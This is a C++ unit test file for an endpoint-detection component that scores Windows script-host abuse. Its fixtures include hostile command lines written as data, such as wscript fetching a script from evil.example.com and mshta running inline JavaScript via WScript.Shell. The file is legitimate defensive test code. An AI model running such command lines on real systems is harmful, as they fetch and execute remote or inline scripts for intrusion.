#include "script_host_abuse_detector_tests.h"

#include <cstdlib>
#include <stdexcept>
#include <string>

#include "edr_event.h"
#include "event_bus.h"
#include "script_host_abuse_detector.h"

namespace {

#define SHA_CHECK(cond) Check((cond), #cond, __LINE__)

void Check(bool cond, const char* expr, int line) {
    if (!cond)
        throw std::runtime_error(
            "script host abuse test failed at line " +
            std::to_string(line) + ": " + expr);
}

edr::Event ProcStart(const std::string& image, const std::string& cmdLine,
                     uint32_t pid) {
    edr::Event ev;
    ev.type = EDR_EVT_PROCESS_START;
    ev.pid = pid;
    ev.fields[edr::field::kImage] = image;
    ev.fields[edr::field::kCommandLine] = cmdLine;
    return ev;
}

void TestWscriptRemotePayload() {
    edr::ScriptHostAbuseDetector det(true);
    edr::Event ev = ProcStart(
        "C:\\Windows\\System32\\wscript.exe",
        "wscript.exe http://evil.example.com/stage.js", 1001);
    det.Enrich(ev);
    SHA_CHECK(ev.fields.count(edr::field::kScriptHostScore) > 0);
    SHA_CHECK(ev.fields.at(edr::field::kScriptHostScore) == "55");
    SHA_CHECK(ev.fields.at(edr::field::kScriptHostEngine) == "wscript");
    SHA_CHECK(ev.fields.at(edr::field::kScriptHostSignals)
                  .find("remote_payload") != std::string::npos);
}

void TestMshtaInlineScript() {
    edr::ScriptHostAbuseDetector det(true);
    edr::Event ev = ProcStart(
        "C:\\Windows\\System32\\mshta.exe",
        "mshta.exe javascript:\"eval(ActiveXObject('WScript.Shell'))\"",
        1002);
    det.Enrich(ev);
    SHA_CHECK(ev.fields.count(edr::field::kScriptHostScore) > 0);
    SHA_CHECK(ev.fields.at(edr::field::kScriptHostScore) == "40");
    SHA_CHECK(ev.fields.at(edr::field::kScriptHostSignals)
                  .find("inline_script") != std::string::npos);
}

void TestTransientLocation() {
    edr::ScriptHostAbuseDetector det(true);
    edr::Event ev = ProcStart(
        "C:\\Windows\\System32\\cscript.exe",
        "cscript.exe //nologo C:\\Users\\alice\\Downloads\\update.vbs",
        1003);
    det.Enrich(ev);
    SHA_CHECK(ev.fields.count(edr::field::kScriptHostScore) > 0);
    SHA_CHECK(ev.fields.at(edr::field::kScriptHostScore) == "25");
    SHA_CHECK(ev.fields.at(edr::field::kScriptHostSignals)
                  .find("transient_location") != std::string::npos);
}

void TestEncodedBlobArgument() {
    edr::ScriptHostAbuseDetector det(true);
    std::string blob(240, 'A');
    for (size_t i = 0; i < blob.size(); i += 7)
        blob[i] = 'x';
    edr::Event ev = ProcStart(
        "C:\\Windows\\System32\\wscript.exe",
        "wscript.exe //e:vbscript " + blob, 1004);
    det.Enrich(ev);
    SHA_CHECK(ev.fields.count(edr::field::kScriptHostScore) > 0);
    SHA_CHECK(ev.fields.at(edr::field::kScriptHostSignals)
                  .find("encoded_payload") != std::string::npos);
}

void TestCombinedMalicious() {
    edr::ScriptHostAbuseDetector det(true);
    edr::Event ev = ProcStart(
        "C:\\Windows\\System32\\cscript.exe",
        "cscript.exe //nologo http://evil.example.com/C:\\Temp\\x.vbs",
        1005);
    det.Enrich(ev);
    const uint32_t score = static_cast<uint32_t>(std::atoi(
        ev.fields.at(edr::field::kScriptHostScore).c_str()));
    SHA_CHECK(score >= 75);
    SHA_CHECK(ev.fields.at(edr::field::kScriptHostVerdict) == "MALICIOUS");
}

void TestBenignNoStamp() {
    edr::ScriptHostAbuseDetector det(true);
    edr::Event ev = ProcStart(
        "C:\\Windows\\System32\\wscript.exe",
        "wscript.exe C:\\Windows\\System32\\slmgr.vbs /ato", 1006);
    det.Enrich(ev);
    SHA_CHECK(ev.fields.find(edr::field::kScriptHostScore) ==
              ev.fields.end());
}

void TestNonScriptHostNoStamp() {
    edr::ScriptHostAbuseDetector det(true);
    edr::Event ev = ProcStart("C:\\Windows\\System32\\notepad.exe",
                              "notepad.exe file.txt", 1007);
    det.Enrich(ev);
    SHA_CHECK(ev.fields.find(edr::field::kScriptHostScore) ==
              ev.fields.end());
}

void TestDisabledNoStamp() {
    edr::ScriptHostAbuseDetector det(false);
    edr::Event ev = ProcStart(
        "C:\\Windows\\System32\\wscript.exe",
        "wscript.exe http://evil.example.com/stage.js", 1008);
    det.Enrich(ev);
    SHA_CHECK(ev.fields.find(edr::field::kScriptHostScore) ==
              ev.fields.end());
}

} // namespace

void RunScriptHostAbuseDetectorTests() {
    TestWscriptRemotePayload();
    TestMshtaInlineScript();
    TestTransientLocation();
    TestEncodedBlobArgument();
    TestCombinedMalicious();
    TestBenignNoStamp();
    TestNonScriptHostNoStamp();
    TestDisabledNoStamp();
}
